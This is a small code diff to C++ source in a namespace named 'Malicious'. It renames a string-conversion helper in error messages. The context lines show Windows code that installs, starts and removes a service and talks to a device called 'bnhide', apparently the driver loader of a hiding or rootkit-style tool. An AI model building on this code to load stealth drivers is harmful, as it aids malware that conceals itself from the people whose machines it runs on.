@@ -47,7 +47,7 @@ namespace Malicious
         HANDLE hdev = CreateFile("\\\\.\\bnhide", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
         if(hdev == INVALID_HANDLE_VALUE)
         {
-            throw DriverError("Unable to create device file (CreateFile) : "+to_string(GetLastError()));
+            throw DriverError("Unable to create device file (CreateFile) : "+toString(GetLastError()));
         }
 
         DATA_SURVEY dts;
@@ -67,7 +67,7 @@ namespace Malicious
         CloseHandle(hdev);
         if(!b)
         {
-			throw DriverError("DeviceIoControl failed : "+to_string(GetLastError()));
+			throw DriverError("DeviceIoControl failed : "+toString(GetLastError()));
         }
     }
 
@@ -85,7 +85,7 @@ namespace Malicious
         manager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
         if(!manager)
         {
-            throw DriverError("OpenSCManager failed : "+to_string(GetLastError()));
+            throw DriverError("OpenSCManager failed : "+toString(GetLastError()));
         }
     }
     
@@ -99,7 +99,7 @@ namespace Malicious
         service = OpenService(manager, sznamesys, SERVICE_ALL_ACCESS);
         if(!service)
         {
-            throw DriverError("OpenService failed : "+to_string(GetLastError()));
+            throw DriverError("OpenService failed : "+toString(GetLastError()));
         }
     }
 
@@ -130,12 +130,12 @@ namespace Malicious
             }
             else 
             {
-                throw DriverError("CreateService failed : "+to_string(GetLastError()));
+                throw DriverError("CreateService failed : "+toString(GetLastError()));
             }
         }
         if(!StartService(service, 0, 0))
         {
-            throw DriverError("StartService failed : "+to_string(GetLastError()));
+            throw DriverError("StartService failed : "+toString(GetLastError()));
         }
     }
 
@@ -146,7 +146,7 @@ namespace Malicious
         ControlService(service, SERVICE_CONTROL_STOP, &status);
         if(!DeleteService(service)) 
         {
-            throw DriverError("DeleteService failed : "+to_string(GetLastError()));
+            throw DriverError("DeleteService failed : "+toString(GetLastError()));
         }
     }
 } // Malicious
